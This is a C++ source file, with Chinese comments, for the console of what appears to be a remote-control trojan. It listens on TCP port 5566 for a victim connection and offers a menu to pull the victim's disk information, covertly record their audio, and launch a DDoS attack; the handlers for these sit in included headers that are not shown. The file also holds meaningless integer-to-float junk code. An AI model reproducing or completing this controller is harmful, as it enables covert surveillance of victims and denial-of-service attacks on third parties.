// RemoteControlServer.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "DataContainer.h"
#include "DiskInfoExtractor.h"
#include "AudioSpyExtractor.h"
#include "DDosOpenExtractor.h"
#include "utils.h"
#include <thread>
#pragma comment(lib,"ws2_32.lib")

using namespace std;

int main() {
    // 监听端口等待连接
    std::cout << "欢迎使用远控控制台\n" << endl;;

    int i = 0x00408238;
    char keyAry[256];

    float f = (float)0x0211DBD0;

    memcpy(&f, &i, 4);
    i = f;
    //初始化DLL
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA wsdata;
    if (WSAStartup(sockVersion, &wsdata) != 0)
    {
        return 1;
    }

    //创建套接字
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET)
    {
        cout << "Socket error" << endl;
        return 1;
    }


    //绑定套接字
    sockaddr_in sockAddr;
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(5566);
    sockAddr.sin_addr.S_un.S_addr = INADDR_ANY;

    if (bind(serverSocket, (sockaddr*)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR) {
        cout << "Bind error" << endl;
        return 1;
    }

    //开始监听
    if (listen(serverSocket, 10) == SOCKET_ERROR) {
        cout << "Listen error" << endl;
        return 1;
    }
    DataContainer connector;
    connector.DataContainerExpansion(400);
    SOCKET clientSocket = 0;
    sockaddr_in client_sin;

    int flag = 0;//是否已经连接上
    int len = sizeof(client_sin);
    string orinal;
    cout << "等待连接..." << endl;

    clientSocket = accept(serverSocket, (sockaddr*)&client_sin, &len);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Accept error" << endl;
        flag = 0;
        return 1;
    }

    cout << "连接成功，接收到一个链接：" << inet_ntoa(client_sin.sin_addr) << endl;

    cout << "1、获取磁盘信息" << endl;
    cout << "2、语音监控" << endl;
    cout << "3、开启DDos攻击" << endl;
    cout << "请输入功能序号" << endl;
    cin >> orinal;
    switch (orinal.c_str()[0]) {
    case '1':
        cout << clientSocket << endl;
        clientSocket = getDiskInfo(clientSocket, serverSocket);
        break;
    case '2':
        cout << clientSocket << endl;
        clientSocket = getAudioInfo(clientSocket, serverSocket);
        break;
    case '3':
        cout << clientSocket << endl;
        clientSocket = getDDosOpenInfo(clientSocket, serverSocket);
        break;
    default:
        cout << "无此功能" << endl;
        break;
        
    }
    return  0;
}
